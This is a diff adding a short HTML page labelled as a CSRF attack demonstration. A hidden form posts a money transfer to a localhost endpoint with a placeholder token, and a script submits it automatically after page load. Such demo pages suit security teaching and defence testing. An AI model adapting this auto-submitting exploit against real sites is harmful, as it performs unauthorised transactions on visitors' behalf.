@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Example</title>
+</head>
+<body>
+    <h1>CSRF Attack Example</h1>
+    <p>This page simulates a CSRF attack by automatically submitting a form to transfer money.</p>
+
+    <form id="csrf-attack-form" action="http://localhost:8070/transfer" method="post">
+        <input type="hidden" name="amount" value="100">
+        <input type="hidden" name="_csrf" value="CSRF_TOKEN_PLACEHOLDER">
+    </form>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                document.getElementById('csrf-attack-form').submit();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
